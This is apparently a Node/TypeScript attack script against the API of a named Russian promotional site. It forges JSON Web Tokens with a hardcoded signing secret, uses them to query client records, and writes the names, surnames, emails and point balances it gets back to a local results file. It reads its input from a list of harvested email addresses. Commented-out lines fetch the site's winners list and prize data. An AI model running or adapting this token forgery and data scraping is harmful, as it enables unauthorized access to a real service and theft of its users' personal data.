import {CustomRequest} from "../utils/request";

const jwt = require('jsonwebtoken');
import {Utils} from "../utils/utils";

(<any>global).fetch = require("node-fetch");

const utils = new Utils();

(async () => {
  const values = {};
  const emails = utils.readSyncFile('dirol/output/result_domain01-06.txt');
  const data = emails.map(value => {
    let match = value.match(/([^ ]+@.*?) /);
    return match[1];
  });
  const request = new CustomRequest({}, false);
  // const res = await request.get("https://adm.dirolpromo.ru/api/winners?count=100000").catch(value => <any>console.log(value));
  // const data = res.data;

  for (let value of data) {
    values[value] = value;
  }

  const keys = Object.keys(values);
  for (let i = 0; i < keys.length; ++i) {
    const a = await main(request, keys[i]);
    if (a) { i--; }
  }
})();


async function main(request: CustomRequest, email) {
  const secretKey = '[N%"D9&RJ{_A3EkK5`7dkh+%:';
  const now = Date.now() / 1000 - 200;

  const token = jwt.sign({ "iss": "Raiffeisen", user_id: 12111, "iat": now, "exp": now + 900 }, secretKey);
  try {
    let res = await request.get("https://adm.dirolpromo.ru/api/client", { headers: { 'Authorization': token } });
    const json = res.data;
    if (!json.client) { return true }
    // fetch("https://adm.dirolpromo.ru/api/client/prizes", { headers: { 'Authorization': token } }).then(text => text.json())
    //   .then(value => utils.appendSyncFile('cookie/resultPrizes2.txt', `${json.client.email}. Prizes: ${JSON.stringify(value)}` + '\n'));

    console.log(`${json.client.name} ${json.client.surname} ${json.client.email}. Points: ${json.client.points}`);
    utils.appendSyncFile('cookie/result22.txt', `${json.client.name} ${json.client.surname} ${json.client.email}. Points: ${json.client.points}`);
  } catch (e) {
    console.log(e)
  }
  process.exit();

  return;
}
